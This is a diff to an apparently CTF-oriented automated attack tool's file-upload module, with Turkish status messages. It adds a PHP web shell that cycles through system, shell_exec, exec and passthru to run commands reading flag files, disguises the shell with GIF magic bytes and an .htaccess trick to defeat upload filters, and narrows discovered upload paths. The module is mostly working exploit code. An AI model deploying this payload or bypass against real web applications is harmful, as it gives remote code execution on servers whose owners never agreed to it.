@@ -16,11 +16,17 @@ from rich.console import Console
 console = Console(legacy_windows=False)
 
 _MARKER = "TWEB_RCE_PROBE"
+# Try multiple execution functions — system() is often disabled in CTF PHP configs.
+# $c is single-quoted so no PHP variable expansion; shell handles it.
 _SHELL = (
-    f"<?php echo '{_MARKER}'; "
-    "system('cat /flag* 2>/dev/null; "
-    "cat /root/flag.txt 2>/dev/null; "
-    "cat /home/*/flag* 2>/dev/null'); ?>"
+    f"<?php echo '{_MARKER}';"
+    "$c='cat /flag /flag.txt /root/flag.txt /var/www/html/flag.txt /home/ctf/flag.txt 2>/dev/null';"
+    "if(function_exists('system')){system($c);}"
+    "elseif(function_exists('shell_exec')){echo shell_exec($c);}"
+    "elseif(function_exists('exec')){exec($c,$o);echo implode(chr(10),$o);}"
+    "elseif(function_exists('passthru')){passthru($c);}"
+    "else{echo 'CMD_DISABLED';}"
+    "?>"
 )
 _GIF_SHELL = "GIF89a\n" + _SHELL
 # .htaccess that enables PHP execution — prepended with GIF magic bytes to pass
@@ -124,9 +130,10 @@ class UploadAttack(BaseAttack):
             ]
             console.print(f"  [dim][Upload] listing {lurl} → 200 | srcs={all_srcs[:10]}[/dim]")
             for p in all_srcs:
-                if not p.startswith(("http://", "https://")):
-                    p = "/" + p.lstrip("/")
-                found.append(p)
+                if any(d in p.lower() for d in _UPLOAD_HINT_DIRS):
+                    if not p.startswith(("http://", "https://")):
+                        p = "/" + p.lstrip("/")
+                    found.append(p)
         return list(dict.fromkeys(found))
 
     async def _check_exec(self, file_url: str, debug: bool = False) -> tuple[bool, list[dict]]:
@@ -185,6 +192,7 @@ class UploadAttack(BaseAttack):
             for fname, ct, content in BYPASS_PAYLOADS
         ]
 
+        any_upload_ok = False
         for fname, ct, content in local_payloads:
             if self._should_stop():
                 return []
@@ -224,6 +232,8 @@ class UploadAttack(BaseAttack):
 
             # Build candidate URLs for the uploaded file
             upload_ok = "success" in body.lower()
+            if upload_ok:
+                any_upload_ok = True
             response_paths = self._find_paths_in_response(body, fname)
             console.print(
                 f"  [dim][Upload] {fname} → HTTP {resp.status_code}"
@@ -277,4 +287,14 @@ class UploadAttack(BaseAttack):
                         self.stop_event.set()
                     return findings
 
+        if any_upload_ok:
+            console.print(
+                "  [yellow][Upload][/yellow] Bypass çalışıyor ama URL otomatik tespit edilemedi. "
+                "Admin listing sayfasında yüklenen dosyanın URL'ini manuel kontrol edin."
+            )
+            return [{
+                "type": "upload_bypass_no_rce",
+                "value": f"File upload bypass confirmed @ {url} — PHP path not auto-detected; check admin panel",
+                "confidence": 0.55,
+            }]
         return []
